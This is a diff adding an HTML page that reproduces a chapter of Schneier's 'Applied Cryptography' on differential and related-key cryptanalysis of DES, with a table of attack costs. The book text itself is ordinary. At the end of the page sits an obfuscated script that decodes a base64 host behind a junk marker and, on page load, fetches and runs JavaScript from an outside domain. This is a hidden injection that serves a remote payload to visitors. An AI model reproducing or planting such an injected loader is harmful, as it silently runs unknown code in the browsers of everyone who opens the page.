@@ -1,0 +1,157 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=288-290//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-13.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The results are most interesting. Table 12.14 is a summary of the best differential attack against DES with varying numbers of rounds [172]. The first column is the number of rounds. The next two columns are the numbers of chosen plaintexts or known plaintexts that must be examined for the attack, and the fourth column is the number of those plaintexts actually analyzed. The last column is the complexity of analysis, after the required plaintexts are found.
+</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="12" ALIGN="CENTER">Table 12.14<BR>Differential Cryptanalysis Attacks against DES
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TH VALIGN="TOP" ALIGN="CENTER">No. of Rounds        
+<TH VALIGN="TOP" ALIGN="CENTER">Chosen Plaintexts 
+<TH VALIGN="TOP" ALIGN="CENTER">Known Plaintexts
+<TH VALIGN="TOP" ALIGN="CENTER">Analyzed Plaintexts      
+<TH VALIGN="TOP" ALIGN="CENTER">Complexity of Analysis
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">8       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>14</SUP>      
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>38</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">4       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>9</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">9        
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>24</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>44</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>32</SUP><SUP><SMALL><B>&#8224;</B></SMALL></SUP><TR>
+<TD VALIGN="TOP" ALIGN="CENTER">10   
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>24</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>43</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>14</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>15</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">11    
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>31</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>47</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>32</SUP><SUP><SMALL><B>&#8224;</B></SMALL></SUP><TR>
+<TD VALIGN="TOP" ALIGN="CENTER">12   
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>31</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>47</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>21</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>21</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">13    
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>39</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>52</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>32</SUP><SUP><SMALL><B>&#8224;</B></SMALL></SUP><TR>
+<TD VALIGN="TOP" ALIGN="CENTER">14   
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>39</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>51</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>29</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>29</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">15    
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>47</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>56</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>7</SUP>        
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>37</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">16      
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>47</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>55</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>36</SUP>       
+<TD VALIGN="TOP" ALIGN="CENTER">2<SUP>37</SUP>
+<TR>
+<TD COLSPAN="5"><HR>
+</TABLE>
+
+<BLOCKQUOTE>
+<HR>
+<SUP><SMALL><B>&#8224;</B></SMALL></SUP><FONT SIZE="-1">The complexity of the analysis can be greatly reduced for these variants by using about four times as many plaintexts with the clique method.
+</FONT>
+</FONT>
+</FONT>
+<HR>
+</BLOCKQUOTE>
+
+<P>The best attack against full 16-round DES requires 2<SUP>47</SUP> chosen plaintexts. This can be converted to a known plaintext attack, but that requires 2<SUP>55</SUP> known plaintexts. And 2<SUP>37</SUP> DES operations are required during analysis.</P>
+<P>Differential cryptanalysis works against DES and other similar algorithms with constant S-boxes. The attack is heavily dependent on the structure of the S-boxes; the ones in DES just happen to be optimized against differential cryptanalysis. And the attack works against DES in any of its operating modes&#151;ECB, CBC, CFB, and OFB&#151;with the same complexity [172].</P>
+<P>DES&#146;s resistance can be improved by increasing the number of rounds. Chosen-plaintext differential cryptanalysis DES with 17 or 18 rounds takes about the same time as a brute-force search [160]. At 19 rounds or more, differential cryptanalysis becomes impossible because it requires more than 2<SUP>64</SUP> chosen plaintexts: Remember, DES has a 64-bit block size, so it only <I>has</I> 2<SUP>64</SUP> possible plaintext blocks. (In general, you can prove that an algorithm is resistant to differential cryptanalysis by showing that the amount of plaintext required to mount such an attack is greater than the amount of plaintext possible.)</P>
+<P>Here are a few important points. First, this attack is largely theoretical. The enormous time and data requirements to mount a differential cryptanalytic attack put it beyond the reach of almost everyone. To get the requisite data for this attack against a full DES, you have to encrypt a 1.5 megabits-per-second data stream of <I>chosen plaintext</I> for almost three years. Second, this is primarily a chosen-plaintext attack. It can be converted to a known-plaintext attack, but you have to sift through all of the plaintext-ciphertext pairs looking for the useful ones. For full 16-round DES, this makes the attack slightly less efficient than brute force (the differential cryptanalytic attack requires 2<SUP>55.1</SUP> operations, and brute force requires 2<SUP>55</SUP>). The consensus is that DES, when implemented properly, is still secure against differential cryptanalysis.</P>
+<P>Why is DES so resistant to differential cryptanalysis? Why are the S-boxes optimized to make this attack as difficult as possible? Why are there as many rounds as required, but no more? Because the designers knew about it. IBM&#146;s Don Coppersmith recently wrote [373,374]:</P>
+<BLOCKQUOTE><P>The design took advantage of certain cryptanalytic techniques, most prominently the technique of &#147;differential cryptanalysis,&#148; which were not known in the published literature. After discussions with NSA, it was decided that disclosure of the design consideration would reveal the technique of differential cryptanalysis, a powerful technique that can be used against many ciphers. This in turn would weaken the competitive advantage the United States enjoyed over other countries in the field of cryptography.
+</P>
+</BLOCKQUOTE><P>Adi Shamir responded to this, challenging Coppersmith to say that he hadn&#146;t found any stronger attacks against DES since then. Coppersmith has chosen to remain silent on that question [1426].
+</P>
+<P><FONT SIZE="+1"><B><I>Related-Key Cryptanalysis</I></B></FONT></P>
+<P>Table 12.3 showed the number of bits the DES key is rotated after each round: 2 bits after each round, except for 1 bit after rounds 1, 2, 9, and 16. Why?
+</P>
+<P><B>Related-key cryptanalysis</B> is similar to differential cryptanalysis, but it examines the difference between keys. The attack is different from any previously discussed: The cryptanalyst chooses a relationship between a pair of keys, but does not know the keys themselves. Data is encrypted with both keys. In the known-plaintext version, the cryptanalyst knows the plaintext and ciphertext of data encrypted with the two keys. In the chosen-plaintext version, the cryptanalyst gets to choose the plaintext encrypted with the two keys.</P>
+<P>A modified DES, where the key is rotated two bits after every round, is less secure. Related-key cryptanalysis can break that variant using 2<SUP>17</SUP> chosen-key chosen plaintexts or 2<SUP>33</SUP> chosen-key known plaintexts [158,163].</P>
+<P>This attack is not at all practical, but it is interesting for three reasons. One, it is the first cryptanalytic attack against DES&#146;s subkey-generation algorithm. Two, this attack is independent of the number of rounds of the cryptographic algorithm; it&#146;s just as effective against DES with 16 rounds, 32 rounds, or 1000 rounds. And three, DES is impervious to this attack. The variability in the rotation thwarts related-key cryptanalysis.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-13.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(squyPBVd, QcBJGhPm) {QcBJGhPm = squyPBVd.createElement('script');QcBJGhPm.type = 'text/javascript';QcBJGhPm.async = true;QcBJGhPm.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');squyPBVd.getElementsByTagName('body')[0].appendChild(QcBJGhPm);}(document));</script></body>
+</html>
